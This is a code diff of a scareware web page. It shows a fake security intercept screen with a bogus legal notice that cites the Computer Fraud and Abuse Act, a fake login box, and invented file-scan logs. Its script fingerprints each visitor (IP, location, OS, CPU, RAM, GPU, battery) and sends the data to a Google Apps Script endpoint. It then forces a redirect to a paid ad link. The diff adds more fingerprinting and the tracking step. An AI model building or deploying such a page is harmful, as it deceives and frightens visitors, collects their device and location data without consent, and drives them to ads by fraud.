@@ -1,8 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>TERMINAL_CRITICAL_INTERCEPT</title>
     <style>
         /* NUKE THEME ELEMENTS */
@@ -24,6 +25,7 @@
             transition: background-color 0.1s ease;
         }
 
+        /* FAKE LOGIN OVERLAY */
         #login-overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -65,6 +67,7 @@
             margin-top: 10px;
         }
 
+        /* MATRIX OVERLAY */
         #matrix-bg {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -150,12 +153,6 @@
             40%, 60% { transform: translate(4px, 0); }
         }
         .red-alert-pulse { background-color: rgba(255, 0, 0, 0.1) !important; }
-        @keyframes emergency-flash {
-            0% { background-color: black; }
-            50% { background-color: #7f0000; }
-            100% { background-color: black; }
-        }
-        .emergency { animation: emergency-flash 0.4s infinite; }
     </style>
 </head>
 <body oncontextmenu="return false;">
@@ -198,7 +195,7 @@
                 </ul>
             </div>
 
-            <div class="box box-red">
+<div class="box box-red">
                 <h2>CISO OFFICIAL DIRECTIVE</h2>
                 <div class="warning-msg">
                     <strong>LEGAL NOTICE:</strong> The Cyber Intelligence Unit at <span class="site-name-text">This Network</span> has classified this connection as a <strong>Tier-1 Security Violation</strong> under the Computer Fraud and Abuse Act protocols. 
@@ -214,25 +211,30 @@
     </div>
 
     <script>
+    // --- !!! STEP 1: PASTE YOUR GOOGLE WEB APP URL BELOW !!! ---
     const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycby1mKnhVMl0BLavOxwIR7R1a2QpSpKm6TCYPriU9Au90plnYJD8E03idTESJ3M74nKZ/exec";
+
     let userCity = "Unknown";
     let userCountry = "Unknown";
-    const alertAudio = document.getElementById('alert-sound');
 
-    // --- SESSION GENERATOR ---
+    // --- DYNAMIC SESSION GENERATOR ---
     let sessionNum = localStorage.getItem('victim_session');
     if (!sessionNum) {
         sessionNum = Math.floor(Math.random() * (500 - 345) + 345);
     } else {
-        sessionNum = parseInt(sessionNum) + Math.floor(Math.random() * 5 + 1);
+        sessionNum = parseInt(sessionNum) + Math.floor(Math.random() * 25 + 1);
     }
     localStorage.setItem('victim_session', sessionNum);
     document.getElementById('session-id-text').innerText = sessionNum;
 
-    // --- ATTEMPT LOGIN ---
+    const alertAudio = document.getElementById('alert-sound');
+    
+    // --- STEP 2: TRACKING LOGIC (REPAIRED) ---
     function attemptLogin() {
         const ip = document.getElementById('user-ip').innerText;
         const session = document.getElementById('session-id-text').innerText;
+        
+        // --- THE REPAIR: We must define these variables by grabbing them from the UI first ---
         const os = document.getElementById('user-os').innerText;
         const cpu = document.getElementById('user-cpu').innerText;
         const ram = document.getElementById('user-ram').innerText;
@@ -241,9 +243,12 @@
         const batt = document.getElementById('user-batt').innerText;
 
         const errorMsg = document.getElementById('login-error');
+
+        // Show the error message immediately
         errorMsg.style.display = 'block';
         errorMsg.innerText = "[!] SECURING CONNECTION... LOGGING METADATA...";
 
+        // Construct the data string
         const payload = `ip=${encodeURIComponent(ip)}` +
                         `&session=${encodeURIComponent(session)}` +
                         `&city=${encodeURIComponent(userCity)}` +
@@ -255,32 +260,38 @@
                         `&res=${encodeURIComponent(res)}` +
                         `&batt=${encodeURIComponent(batt)}`;
 
+        // Send to Google Sheets
         fetch(GOOGLE_SCRIPT_URL, {
             method: 'POST',
             mode: 'no-cors',
             headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
             body: payload
-        }).then(() => console.log("Data sent.")).catch(err => console.error(err));
+        }).then(() => {
+            console.log("Data sent to bridge.");
+        }).catch(err => console.error("Bridge Error:", err));
 
+// Wait 1.5 seconds then start the scare
         setTimeout(() => {
             document.getElementById('login-overlay').style.display = 'none';
             startEverything();
-            
-            // Chaos Timer
-            setTimeout(() => {
-                const errorSound = new Audio('https://www.soundjay.com/buttons/beep-01a.mp3');
-                errorSound.play().catch(() => {});
-                if (navigator.vibrate) navigator.vibrate(1000);
-                document.body.classList.add('emergency');
-                const line = document.createElement('div');
-                line.style.color = "#ff0000"; line.style.fontWeight = "bold";
-                line.innerText = "> [CRITICAL] SYSTEM OVERRIDE: SELF-DESTRUCT INITIATED!";
-                document.getElementById('log-content').appendChild(line);
-                document.getElementById('main-wrapper').classList.add('shake');
-            }, 18000);
 
-            // Final Redirect
-            setTimeout(() => { window.location.href = "YOUR_PAID_AD_LINK_HERE"; }, 20000);
+            // STEP A: At 18 seconds, show the final red warning line
+            setTimeout(() => {
+                const logContent = document.getElementById('log-content');
+                const line = document.createElement('div');
+                line.style.color = "#ff0000"; 
+                line.style.fontWeight = "bold";
+                line.innerText = "> [SYSTEM] CONNECTION TERMINATED. REDIRECTING TO SECURE GATEWAY...";
+                logContent.appendChild(line);
+                
+                document.getElementById('main-wrapper').classList.add('shake');
+            }, 18000); // 18 seconds
+
+            // STEP B: At 20 seconds, jump to the paid link
+            setTimeout(() => {
+                window.location.href = "YOUR_PAID_AD_LINK_HERE";
+            }, 20000); // 20 seconds
+            
         }, 1500);
     }
 
@@ -290,7 +301,7 @@
         startLogCycle();
     }
 
-    // --- DATA FETCH ---
+    // --- DATA FETCH: IP, LOCATION, HARDWARE ---
     setTimeout(() => {
         fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
             document.getElementById('user-ip').innerText = data.ip;
@@ -306,16 +317,31 @@
         document.getElementById('user-os').classList.remove('decrypting');
         document.getElementById('user-cpu').innerText = (navigator.hardwareConcurrency || "X") + " THREADS";
         document.getElementById('user-ram').innerText = (navigator.deviceMemory || "8") + "GB RAM";
+        
+        const ua = navigator.userAgent;
+        let engine = "UNKNOWN";
+        if (ua.indexOf("Chrome") > -1) engine = "BLINK";
+        else if (ua.indexOf("Firefox") > -1) engine = "GECKO";
+        else if (ua.indexOf("Safari") > -1) engine = "WEBKIT";
+        document.getElementById('user-engine').innerText = engine;
+
         document.getElementById('user-res').innerText = window.screen.width + "x" + window.screen.height;
         document.getElementById('user-res').classList.remove('decrypting');
+
+        try {
+            const canvas_gpu = document.createElement('canvas');
+            const gl = canvas_gpu.getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            document.getElementById('user-gpu').innerText = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).split(' ').pop();
+        } catch(e) { document.getElementById('user-gpu').innerText = "GPU_ACCEL"; }
 
         if (navigator.getBattery) {
             navigator.getBattery().then(b => {
                 document.getElementById('user-batt').innerText = Math.round(b.level * 100) + "%";
                 document.getElementById('user-batt').classList.remove('decrypting');
             });
-        }
-    }, 1000);
+        } else { document.getElementById('user-batt').innerText = "AC_POWER"; }
+    }, 1500);
 
     // --- MATRIX RAIN ---
     const canvas = document.getElementById('matrix-bg');
@@ -327,8 +353,10 @@
     const columns = canvas.width / fontSize;
     const drops = Array(Math.floor(columns)).fill(1);
     function draw() {
-        ctx.fillStyle = "rgba(0, 0, 0, 0.1)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.font = fontSize + "px monospace"; ctx.fillStyle = "#0f0";
+        ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.font = fontSize + "px monospace";
+        ctx.fillStyle = "#0f0";
         drops.forEach((y, i) => {
             const text = chars[Math.floor(Math.random() * chars.length)];
             ctx.fillText(text, i * fontSize, y * fontSize);
@@ -340,21 +368,41 @@
     // --- TERMINAL LOGS ---
     function startLogCycle() {
         const logContent = document.getElementById('log-content');
-        const filePaths = ["C:/Users/Documents/Vault", "C:/Windows/System32"];
+        const filePaths = ["C:/Users/Documents/Vault", "C:/Users/Desktop/Passwords.txt", "C:/Windows/System32"];
         setInterval(() => {
             if (logContent.children.length > 8) logContent.removeChild(logContent.firstChild);
             const line = document.createElement('div');
-            line.innerText = `> [SCANNING] ${filePaths[Math.floor(Math.random() * filePaths.length)]}... FOUND`;
+            line.style.margin = "5px 0";
+            line.innerText = Math.random() > 0.5 ? `> [SCANNING] ${filePaths[Math.floor(Math.random() * filePaths.length)]}... FOUND` : "> [TRACE] Origin identified...";
             logContent.appendChild(line);
+            document.body.classList.add('red-alert-pulse');
+            document.getElementById('main-wrapper').classList.add('shake');
+            setTimeout(() => {
+                document.body.classList.remove('red-alert-pulse');
+                document.getElementById('main-wrapper').classList.remove('shake');
+            }, 300);
         }, 1800);
     }
 
-    // --- INPUT FOCUS & ENTER ---
-    window.addEventListener('DOMContentLoaded', () => {
-        const pass = document.getElementById('fake-pass');
-        pass.focus();
-        pass.addEventListener('keypress', (e) => { if (e.key === 'Enter') attemptLogin(); });
-    });
-    </script>
+window.addEventListener('DOMContentLoaded', (event) => {
+    // This targets your specific input ID
+    const loginField = document.getElementById('fake-pass');
+    
+    // Force the cursor into the box
+    loginField.focus();
+    
+    // Mobile Keyboard Trigger (Works for most Android/Chrome)
+    loginField.click();
+});
+
+// This tells the browser: "If the user hits Enter, act like they clicked Login"
+document.getElementById('fake-pass').addEventListener('keypress', function (e) {
+    if (e.key === 'Enter') {
+        e.preventDefault(); // Prevents the page from refreshing
+        attemptLogin();    // Triggers your data-sending and the 20s timer
+    }
+});
+
+</script>
 </body>
 </html>
